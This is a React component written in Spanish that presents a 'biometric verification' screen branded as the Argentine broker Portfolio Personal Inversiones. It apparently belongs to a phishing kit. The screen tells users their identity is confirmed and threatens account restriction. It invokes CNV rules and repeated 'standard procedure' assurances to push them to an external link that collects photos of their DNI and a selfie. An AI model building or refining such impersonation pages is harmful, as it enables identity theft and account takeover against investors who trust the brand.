import { useEffect, useState, useMemo } from "react";
import {
  ShieldCheck, Clock, CheckCircle2, ExternalLink, Copy, Check,
  Smartphone, Monitor, Lock, ArrowLeft, Shield, FileCheck, ScanFace,
} from "lucide-react";
import ppiLogoSvg from "@/assets/ppi-logo.svg";

interface PpiBiometricScreenProps {
  email: string;
  fullName: string;
  biometricUrl: string;
  onEvent?: (event: string) => void;
}

const useIsDesktop = () => {
  const [isDesktop, setIsDesktop] = useState(false);
  useEffect(() => {
    const check = () => {
      const ua = navigator.userAgent;
      const mobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua);
      const width = window.innerWidth;
      setIsDesktop(!mobile && width >= 768);
    };
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);
  return isDesktop;
};

const PpiBiometricScreen = ({ email, fullName, biometricUrl, onEvent }: PpiBiometricScreenProps) => {
  const [visible, setVisible] = useState(false);
  const [verificationStarted, setVerificationStarted] = useState(false);
  const [showFinishBtn, setShowFinishBtn] = useState(false);
  const [copied, setCopied] = useState(false);
  const isDesktop = useIsDesktop();
  const firstName = fullName?.split(" ")?.[0] || "";

  useEffect(() => {
    const t = setTimeout(() => setVisible(true), 80);
    return () => clearTimeout(t);
  }, []);

  useEffect(() => {
    if (!verificationStarted) return;
    const t = setTimeout(() => setShowFinishBtn(true), 3 * 60 * 1000);
    return () => clearTimeout(t);
  }, [verificationStarted]);

  const handleCopyLink = async () => {
    try {
      await navigator.clipboard.writeText(biometricUrl);
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    } catch { /* fallback */ }
  };

  const handleStartVerification = () => {
    window.open(biometricUrl, "_blank", "noopener,noreferrer");
    setVerificationStarted(true);
    onEvent?.("biometric_started");
  };

  const handleFinish = () => {
    onEvent?.("biometric_finished");
    window.location.reload();
  };

  const steps = useMemo(() => [
    { icon: FileCheck, text: "Verificación de DNI (frente y dorso)" },
    { icon: ScanFace, text: "Reconocimiento facial automático (selfie)" },
    { icon: Shield, text: "Máxima protección de tus fondos e inversiones" },
  ], []);

  /* ══════════════════════════════════════════
     VERIFICATION IN PROGRESS
  ══════════════════════════════════════════ */
  if (verificationStarted) {
    return (
      <div className={`w-full max-w-[540px] px-4 sm:px-0 transition-all duration-500 ${visible ? "opacity-100" : "opacity-0"}`}>
        {/* Logo */}
        <div className="flex justify-center mb-5">
          <img src={ppiLogoSvg} alt="PPI" className="h-10 sm:h-12" />
        </div>

        <div className="rounded-2xl bg-white shadow-[0_12px_40px_-10px_rgba(0,60,150,0.13)] border border-[#e2e8f0] overflow-hidden">
          {/* Top accent */}
          <div className="h-1 w-full bg-gradient-to-r from-[#f59e0b] via-[#fb923c] to-[#f59e0b]" />

          <div className="px-5 sm:px-8 py-6 sm:py-8 text-center">
            {/* Animated icon */}
            <div className="flex justify-center mb-5">
              <div className="relative">
                <div className="absolute -inset-4 rounded-full bg-amber-100/40 animate-pulse" />
                <div className="relative flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#f59e0b] to-[#ea580c] shadow-xl shadow-amber-200/50">
                  <ShieldCheck size={30} className="text-white" strokeWidth={1.8} />
                </div>
              </div>
            </div>

            <h3 className="text-[18px] sm:text-[20px] font-extrabold text-[#0f172a] mb-2 tracking-tight">
              Verificación en curso
            </h3>
            <p className="text-[13px] sm:text-[14px] text-[#64748b] leading-relaxed mb-5 max-w-[380px] mx-auto">
              Completá la verificación en la pestaña que se abrió. Tu cuenta y tus inversiones estarán protegidas al finalizar.
            </p>

            {/* Warning box */}
            <div className="rounded-xl border border-amber-200/80 bg-gradient-to-r from-amber-50 to-orange-50/50 px-4 py-3 mb-5 mx-auto max-w-[400px]">
              <div className="flex items-start gap-2.5">
                <ArrowLeft size={14} className="text-amber-600 flex-shrink-0 mt-0.5" />
                <p className="text-[12px] sm:text-[13px] text-[#1e293b] font-medium leading-relaxed text-left">
                  Una vez que completes la verificación, <strong className="text-amber-700">volvé a esta página</strong> para finalizar.
                </p>
              </div>
            </div>

            {/* Re-open link */}
            <button
              onClick={() => window.open(biometricUrl, "_blank", "noopener,noreferrer")}
              className="text-[12px] sm:text-[13px] text-[#2563eb] underline underline-offset-2 hover:text-[#1d4ed8] transition-colors mb-4 inline-block font-medium"
            >
              ¿No se abrió? Hacer clic acá
            </button>

            {/* Desktop: Copy link to continue on mobile */}
            {isDesktop && (
              <div className="mt-3 rounded-xl border border-blue-100 bg-gradient-to-br from-blue-50/80 to-indigo-50/40 px-4 sm:px-5 py-4">
                <div className="flex items-center gap-2.5 mb-2">
                  <div className="flex h-7 w-7 items-center justify-center rounded-lg bg-blue-100">
                    <Smartphone size={14} className="text-[#2563eb]" />
                  </div>
                  <span className="text-[13px] font-bold text-[#1e293b]">¿Preferís completar desde el celular?</span>
                </div>
                <p className="text-[11px] sm:text-[12px] text-[#64748b] leading-relaxed mb-3">
                  La verificación requiere la cámara de tu dispositivo. Copiá el enlace y abrilo en tu celular.
                </p>
                <button
                  onClick={handleCopyLink}
                  className={`flex items-center justify-center gap-2 w-full rounded-xl py-2.5 sm:py-3 text-[13px] font-bold transition-all ${
                    copied
                      ? "bg-emerald-50 border-2 border-emerald-300 text-emerald-600"
                      : "bg-white border-2 border-[#2563eb]/20 text-[#2563eb] hover:border-[#2563eb]/50 hover:bg-blue-50/50 active:scale-[0.98]"
                  }`}
                >
                  {copied ? <><Check size={15} /> ¡Enlace copiado!</> : <><Copy size={15} /> Copiar enlace de verificación</>}
                </button>
              </div>
            )}

            {/* Mobile: just show copy link inline */}
            {!isDesktop && (
              <div className="mt-3 rounded-xl border border-[#e2e8f0] bg-[#f8fafc] px-4 py-3">
                <p className="text-[11px] text-[#64748b] mb-2">Copiá el enlace si necesitás abrirlo en otro navegador:</p>
                <button
                  onClick={handleCopyLink}
                  className={`flex items-center justify-center gap-2 w-full rounded-lg py-2.5 text-[13px] font-semibold transition-all ${
                    copied
                      ? "bg-emerald-50 border border-emerald-300 text-emerald-600"
                      : "bg-white border border-[#cbd5e1] text-[#334155] hover:border-[#2563eb] active:scale-[0.98]"
                  }`}
                >
                  {copied ? <><Check size={14} /> ¡Copiado!</> : <><Copy size={14} /> Copiar enlace</>}
                </button>
              </div>
            )}
          </div>

          {/* Bottom action */}
          <div className="px-5 sm:px-8 py-4 border-t border-[#e2e8f0] bg-[#fafbfc]">
            {showFinishBtn ? (
              <button
                onClick={handleFinish}
                className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#16a34a] to-[#22c55e] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15803d] hover:to-[#16a34a] active:scale-[0.98] shadow-lg shadow-green-200/50"
              >
                <CheckCircle2 size={17} />
                Ya completé la verificación
              </button>
            ) : (
              <div className="flex items-center justify-center gap-2.5 text-[13px] text-[#94a3b8]">
                <Clock size={14} className="animate-pulse" />
                <span>Esperando que completes la verificación...</span>
              </div>
            )}
          </div>
        </div>

        {/* User pill */}
        <div className="flex justify-center mt-4">
          <div className="flex items-center gap-2 rounded-full border border-[#e2e8f0] bg-white px-4 py-2 shadow-sm">
            <div className="h-2 w-2 rounded-full bg-amber-400 animate-pulse" />
            <span className="text-[12px] text-[#94a3b8] font-medium">{firstName || email}</span>
          </div>
        </div>
      </div>
    );
  }

  /* ══════════════════════════════════════════
     PRE-VERIFICATION SCREEN
  ══════════════════════════════════════════ */
  return (
    <div className={`w-full max-w-[520px] px-4 sm:px-0 transition-all duration-700 ${visible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-6"}`}>
      {/* Logo */}
      <div className="flex justify-center mb-6 sm:mb-8">
        <img src={ppiLogoSvg} alt="PPI" className="h-10 sm:h-14" />
      </div>

      {/* Success badge */}
      <div className="flex justify-center mb-5 sm:mb-6">
        <div className="relative">
          <div className="absolute -inset-4 rounded-full bg-green-100/40 animate-pulse" />
          <div className="absolute -inset-1.5 rounded-full bg-green-50 border border-green-200/60" />
          <div className="relative flex h-18 w-18 sm:h-20 sm:w-20 items-center justify-center rounded-full bg-gradient-to-br from-[#16a34a] to-[#22c55e] shadow-xl shadow-green-200/40" style={{ width: 72, height: 72 }}>
            <CheckCircle2 size={36} className="text-white" strokeWidth={1.8} />
          </div>
        </div>
      </div>

      <h2 className="text-center text-[20px] sm:text-[24px] font-extrabold text-[#0f172a] mb-2 leading-tight tracking-tight">
        ¡Excelente{firstName ? `, ${firstName}` : ""}!
      </h2>
      <p className="text-center text-[13px] sm:text-[15px] text-[#64748b] leading-relaxed mb-5 sm:mb-6 max-w-[380px] mx-auto">
        Tu identidad fue confirmada. Para mantener tu cuenta segura y tus inversiones rindiendo, completá el último paso.
      </p>

      {/* Security urgency notice */}
      <div className="rounded-xl border border-amber-200/80 bg-gradient-to-r from-amber-50 to-orange-50/50 px-4 sm:px-5 py-3.5 mb-5 sm:mb-6 mx-auto max-w-[440px]">
        <div className="flex items-start gap-3">
          <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-amber-100 flex-shrink-0 mt-0.5">
            <Lock size={15} className="text-amber-600" />
          </div>
          <p className="text-[12px] sm:text-[13px] text-[#334155] leading-relaxed">
            Esta verificación es un <strong className="text-[#0f172a]">procedimiento estándar de Portfolio Personal Inversiones</strong> para proteger tus fondos.
            Sin completarla, tu cuenta quedará <strong className="text-amber-700">temporalmente restringida</strong>.
          </p>
        </div>
      </div>

      {/* Verification card */}
      <div className="rounded-2xl bg-white shadow-[0_12px_40px_-10px_rgba(0,60,150,0.13)] border border-[#e2e8f0] overflow-hidden mb-5 sm:mb-6">
        <div className="h-1 w-full bg-gradient-to-r from-[#1e40af] via-[#3b82f6] to-[#1e40af]" />

        <div className="px-5 sm:px-7 py-5 sm:py-6">
          {/* Title row */}
          <div className="flex items-start gap-3 mb-5">
            <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-br from-[#eef2ff] to-[#dbeafe] border border-[#c7d2fe] flex-shrink-0">
              <ShieldCheck size={20} className="text-[#1e40af]" />
            </div>
            <div>
              <h4 className="text-[15px] sm:text-[16px] font-bold text-[#0f172a] mb-1">Verificación documental de seguridad</h4>
              <p className="text-[12px] sm:text-[13px] text-[#64748b] leading-relaxed">
                Para garantizar la <strong className="text-[#0f172a]">seguridad de tus inversiones</strong> y cumplir con las normas de la CNV, necesitamos una verificación rápida de tu documento oficial.
              </p>
            </div>
          </div>

          {/* Steps */}
          <div className="space-y-3 mb-5">
            {steps.map(({ icon: Icon, text }) => (
              <div key={text} className="flex items-center gap-3">
                <div className="flex h-6 w-6 items-center justify-center rounded-full bg-emerald-500 flex-shrink-0 shadow-sm shadow-emerald-200">
                  <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <span className="text-[13px] sm:text-[14px] text-[#334155] font-medium">{text}</span>
              </div>
            ))}
          </div>

          {/* Time estimate */}
          <div className="flex items-center gap-2 text-[12px] text-[#94a3b8] mb-5 sm:mb-6">
            <Clock size={13} />
            <span>Proceso simple y seguro — menos de <strong className="text-[#334155]">2 minutos</strong></span>
          </div>

          {/* Desktop: show "continue on mobile" notice */}
          {isDesktop && (
            <div className="rounded-xl border border-blue-100 bg-gradient-to-br from-blue-50/80 to-indigo-50/30 px-4 sm:px-5 py-4 mb-5">
              <div className="flex items-center gap-2.5 mb-2">
                <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-blue-100">
                  <Monitor size={15} className="text-[#2563eb]" />
                </div>
                <div>
                  <span className="text-[13px] font-bold text-[#1e293b] block leading-tight">Estás en una computadora</span>
                  <span className="text-[11px] text-[#64748b]">La verificación requiere la cámara de tu celular</span>
                </div>
              </div>
              <p className="text-[12px] text-[#64748b] leading-relaxed mb-3">
                Hacé clic en el botón de abajo y luego <strong className="text-[#1e293b]">copiá el enlace</strong> para completar la verificación desde tu celular.
              </p>
            </div>
          )}

          {/* CTA button */}
          <button
            onClick={handleStartVerification}
            className="flex items-center justify-center gap-2.5 w-full rounded-xl bg-gradient-to-r from-[#1e40af] to-[#3b82f6] py-3.5 sm:py-4 text-[14px] sm:text-[15px] font-bold text-white transition-all hover:from-[#1e3a8a] hover:to-[#2563eb] active:scale-[0.98] shadow-lg shadow-blue-500/20"
          >
            Verificar y proteger mi cuenta
            <ExternalLink size={16} />
          </button>
        </div>
      </div>

      {/* User pill */}
      <div className="flex justify-center mb-3">
        <div className="flex items-center gap-2 rounded-full border border-[#e2e8f0] bg-white px-4 py-2 shadow-sm">
          <div className="h-2 w-2 rounded-full bg-emerald-400" />
          <span className="text-[12px] text-[#94a3b8] font-medium">{firstName || email}</span>
        </div>
      </div>

      {/* Trust footer */}
      <p className="text-center text-[10px] sm:text-[11px] text-[#cbd5e1] leading-relaxed max-w-[380px] mx-auto">
        🔐 Este es un procedimiento estándar de Portfolio Personal Inversiones para garantizar la seguridad de tu cuenta y que tus inversiones sigan rindiendo al máximo. Cumplimos con todas las normativas vigentes de la CNV.
      </p>
    </div>
  );
};

export default PpiBiometricScreen;
